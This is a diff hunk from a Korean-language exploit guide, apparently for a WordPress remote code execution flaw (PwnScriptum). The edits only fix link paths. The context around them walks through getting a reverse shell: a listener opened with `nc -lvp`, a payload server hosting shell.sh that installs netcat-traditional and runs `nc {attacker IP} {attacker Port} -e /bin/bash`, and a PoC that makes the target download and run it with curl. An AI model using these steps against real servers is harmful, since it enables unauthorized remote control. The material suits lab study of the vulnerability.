@@ -95,18 +95,18 @@ nc -lvp {attacker Port}
 하지만, 저 명령어를 실행시키기 위해서는 설치해야하는 패키지와 수행해야하는 작업들이 많고, Host 헤더의 제약조건도 까다롭기 때문에, 본 가이드에서는 서버 측에서 `nc {attacker IP} {attacker Port} -e /bin/bash`를 실행시키기 위한 일련의 명령어들을 **쉘 스크립트 형태**로 만들어서, 이를 공격자의 서버에 저장해 놓고, Wordpress 서버에서는 '**curl 명령어**'를 실행시켜 이 스크립트 파일을 다운받아 실행하는 방식으로 리버스 쉘 획득을 진행할 것이다.<br>
 <br>
 ![](2-1.png)
-본 가이드에서 사용한 [쉘 스크립트 파일](pwnscriptum/sample-server/shell.sh)은 sample-server 폴더 내에 shell.sh라는 이름으로 제공된다.
+본 가이드에서 사용한 [쉘 스크립트 파일](sample-server/shell.sh)은 sample-server 폴더 내에 shell.sh라는 이름으로 제공된다.
 쉘 스크립트의 내용을 요약하자면, 리버스 쉘을 획득할 때 **nc 명령어의 -e옵션**을 사용해야 하는데, 기본적으로 설치되어 있는 nc 명령어는 -e옵션을 사용하지 못하도록 막아놓았다. 따라서, -e옵션을 사용할 수 있는 **netcat-traditional 버전을 설치**하고, nc 명령어가 사용할 버전을 **traditional 버전으로 변경**시켜주는 과정을 포함하여 스크립트를 만든 것이다.<br>
 ***해당 스크립트를 사용할 때는, 맨 마지막 줄`nc {your_ip} 1337 -e /bin/bash`에서 {your_ip} 부분을 자신의 IP 주소로 수정해야 한다.*** <br>
 <br>
 이제 쉘 스크립트 파일을 업로드하고, 이를 전송해줄 수 있는 **페이로드 서버**를 만들어야한다. 본인의 웹서버가 이미 구축되어 있다면, 이 과정은 스킵해도 된다.<br>
 ![](2-2.png)
-본 가이드에서는, sample-server 폴더 내에 있는 [sample-server.py](pwnscriptum/sample-server/sample-server.py)를 사용해서 간단한 웹 서버를 열어놓을 것이다.<br>
+본 가이드에서는, sample-server 폴더 내에 있는 [sample-server.py](sample-server/sample-server.py)를 사용해서 간단한 웹 서버를 열어놓을 것이다.<br>
 해당 파일에서는 4000번 port를 사용하였는데, 해당 포트 번호는 본인이 원하는 포트 번호로 수정해도 된다.(만약 이미 사용중인 포트라는 에러가 나온다면, 다른 포트로 바꿔보자.)<br>
 그리고 `python3 sample-server.py`를 입력하여 웹 서버를 구동하면, 자동적으로 `sample-server.py`와 **같은 폴더에 있는 파일들이 서버의 리소스로 인식된다.** <br>
 따라서, 해당 웹 서버가 실행중인 상태에서, `localhost:4000/shell.sh` 혹은 `{your_ip}:4000/shell.sh`로 접속하면 **쉘 스크립트 파일을 다운로드받을 수 있다.** <br>
 <br>
-이로써, Wordpress서버의 리버스 쉘 획득을 위한 준비는 모두 마쳤다. 이제 Wordpress서버에 POST 요청을 보내는 [PoC코드](pwnscriptum/exploit.py)를 실행시키기만 하면 된다.<br>
+이로써, Wordpress서버의 리버스 쉘 획득을 위한 준비는 모두 마쳤다. 이제 Wordpress서버에 POST 요청을 보내는 [PoC코드](exploit.py)를 실행시키기만 하면 된다.<br>
 <br>
 PoC 코드의 사용방법은 다음과 같다.
 ```
